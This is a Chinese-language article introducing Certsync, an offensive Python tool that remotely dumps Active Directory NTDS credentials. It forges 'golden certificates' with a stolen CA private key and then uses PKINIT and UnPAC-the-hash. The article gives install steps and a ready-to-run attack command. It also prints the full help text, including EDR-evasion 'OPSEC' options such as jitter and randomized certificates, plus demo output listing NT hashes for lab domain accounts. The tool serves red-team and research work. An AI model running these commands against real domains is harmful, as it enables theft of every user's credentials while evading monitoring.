![](https://image.3001.net/images/20230731/1690786238_64c759bedce857804e527.jpg!small)

## 关于Certsync

Certsync是一种使用黄金证书和UnPAC哈希值来远程转储NTDS的新技术。在该工具的帮助下，广大研究人员能够轻松获取目标域控制器中的用户列表、CA信息和CRL，并转储CA证书和私钥。值得一提的是，在整个业务流程中，该工具不需要使用到DRSUAPI。除此之外，该工具的运行速度也非常的快，效率非常高。

## 工具功能

> 1、从 LDAP 转储用户列表、CA 信息和 CRL；
>
> 2、转储 CA 证书和私钥；
>
> 3、为每个用户离线伪造证书；
>
> 4、UnPAC 每个用户的哈希以获得 nt 和 lm 哈希；

## 为什么需要Certsync？

由于DSRUAPI（Domain Services Remote Protocol
API）越来越受到EDR解决方案的监控和限制，而Certsync则提供了一种绕过这些限制的新方法。与使用DSRUAPI不同，Certsync不需要域管理员权限，只需要CA管理员权限。

## 工具运行要求

> 1、在域中有配置企业CA的ADCS（Active Directory Certificate Services）服务器；
>
> 2、PKINIT正常工作；
>
> 3、AD中有本地管理员域帐户或导出CA证书和私钥；

## 工具安装

由于该工具基于Python开发，因此我们首先需要在本地设备上安装并配置好Python环境。

接下来，广大研究人员可以使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/zblurx/certsync
    
    cd certsync
    
    pip install .

或者直接使用pip安装：

    
    
    pip install certsync

## 工具使用

广大研究人员可以通过下列方法直接运行Certsync：

    
    
    certsync -u khal.drogo -p 'horse' -d essos.local -dc-ip 192.168.56.12 -ns 192.168.56.12

上述命令将会连接到LDAP服务器，收集用户列表、CA信息和CRL。然后，它会找到CA证书和私钥，并为每个用户生成伪造证书。最后，它会使用UnPAC算法获取用户的nt和lm哈希值。

## 工具帮助信息

可以使用-h参数查看所有可用选项和用法示例：

    
    
    $ certsync -h
    
    usage: certsync [-h] [-debug] [-outputfile OUTPUTFILE] [-ca-pfx pfx/p12 file name] [-ca-ip ip address] [-d domain.local] [-u username] [-p password] [-hashes LMHASH:NTHASH]
    
                    [-no-pass] [-k] [-aesKey hex key] [-use-kcache] [-kdcHost KDCHOST] [-scheme ldap scheme] [-ns nameserver] [-dns-tcp] [-dc-ip ip address]
    
                    [-ldap-filter LDAP_FILTER] [-template cert.pfx] [-timeout timeout] [-jitter jitter] [-randomize]
    
     
    
    Dump NTDS with golden certificates and PKINIT
    
     
    
    options:
    
      -h, --help            show this help message and exit
    
      -debug                Turn DEBUG output ON
    
      -outputfile OUTPUTFILE
    
                            base output filename
    
     
    
    CA options:
    
      -ca-pfx pfx/p12 file name
    
                            Path to CA certificate
    
      -ca-ip ip address     IP Address of the certificate authority. If omitted it will use the domainpart (FQDN) specified in LDAP
    
     
    
    authentication options:
    
      -d domain.local, -domain domain.local
    
                            Domain name
    
      -u username, -username username
    
                            Username
    
      -p password, -password password
    
                            Password
    
      -hashes LMHASH:NTHASH
    
                            NTLM hashes, format is LMHASH:NTHASH
    
      -no-pass              don't ask for password (useful for -k)
    
      -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it
    
                            will use the ones specified in the command line
    
      -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
    
      -use-kcache           Use Kerberos authentication from ccache file (KRB5CCNAME)
    
      -kdcHost KDCHOST      FQDN of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
    
     
    
    connection options:
    
      -scheme ldap scheme
    
      -ns nameserver        Nameserver for DNS resolution
    
      -dns-tcp              Use TCP instead of UDP for DNS queries
    
      -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
    
     
    
    OPSEC options:
    
      -ldap-filter LDAP_FILTER
    
                            ldap filter to dump users. Default is (&(|(objectCategory=person)(objectClass=computer))(objectClass=user))
    
      -template cert.pfx    base template to use in order to forge certificates
    
      -timeout timeout      Timeout between PKINIT connection
    
      -jitter jitter        Jitter between PKINIT connection
    
      -randomize            Randomize certificate generation. Takes longer to generate all the certificates

## OPSEC选项

Certsync提供了一些OPSEC选项，可以自定义工具的行为：

> -ldap-filter：更改用于选择用户名的LDAP过滤器；
>
> -template：在伪造用户证书时使用指定的证书模板；
>
> -timeout和-jitter：调整PKINIT连接之间的超时和间隔时间；
>
> -randomize：随机化证书生成过程，使每个伪造的用户证书具有不同的私钥、序列号和有效期，但会增加生成时间；

使用这些选项可以根据广大研究人员的功能需求自定义Certsync工具的功能。

## 工具运行演示

    
    
    $ certsync -u khal.drogo -p 'horse' -d essos.local -dc-ip 192.168.56.12 -ns 192.168.56.12
    
    [*] Collecting userlist, CA info and CRL on LDAP
    
    [*] Found 13 users in LDAP
    
    [*] Found CA ESSOS-CA on braavos.essos.local(192.168.56.23)
    
    [*] Dumping CA certificate and private key
    
    [*] Forging certificates for every users. This can take some time...
    
    [*] PKINIT + UnPAC the hashes
    
    ESSOS.LOCAL/BRAAVOS$:1104:aad3b435b51404eeaad3b435b51404ee:08083254c2fd4079e273c6c783abfbb7:::
    
    ESSOS.LOCAL/MEEREEN$:1001:aad3b435b51404eeaad3b435b51404ee:b79758e15b7870d28ad0769dfc784ca4:::
    
    ESSOS.LOCAL/sql_svc:1114:aad3b435b51404eeaad3b435b51404ee:84a5092f53390ea48d660be52b93b804:::
    
    ESSOS.LOCAL/jorah.mormont:1113:aad3b435b51404eeaad3b435b51404ee:4d737ec9ecf0b9955a161773cfed9611:::
    
    ESSOS.LOCAL/khal.drogo:1112:aad3b435b51404eeaad3b435b51404ee:739120ebc4dd940310bc4bb5c9d37021:::
    
    ESSOS.LOCAL/viserys.targaryen:1111:aad3b435b51404eeaad3b435b51404ee:d96a55df6bef5e0b4d6d956088036097:::
    
    ESSOS.LOCAL/daenerys.targaryen:1110:aad3b435b51404eeaad3b435b51404ee:34534854d33b398b66684072224bb47a:::
    
    ESSOS.LOCAL/SEVENKINGDOMS$:1105:aad3b435b51404eeaad3b435b51404ee:b63b6ef2caab52ffcb26b3870dc0c4db:::
    
    ESSOS.LOCAL/vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
    
    ESSOS.LOCAL/Administrator:500:aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da:::

## 许可证协议

本项目的开发与发布遵循[
_MIT_](https://github.com/zblurx/certsync/blob/main/LICENSE)开源许可证协议。

## 项目地址

 **Certsync：【[ _GitHub传送门_](https://github.com/zblurx/certsync)】**

## 参考资料

> [ _https://cyberstoph.org/posts/2019/12/an-introduction-to-golden-> certificates/_](https://cyberstoph.org/posts/2019/12/an-introduction-to-> golden-certificates/)
>
> [ _https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-> hash_](https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash)

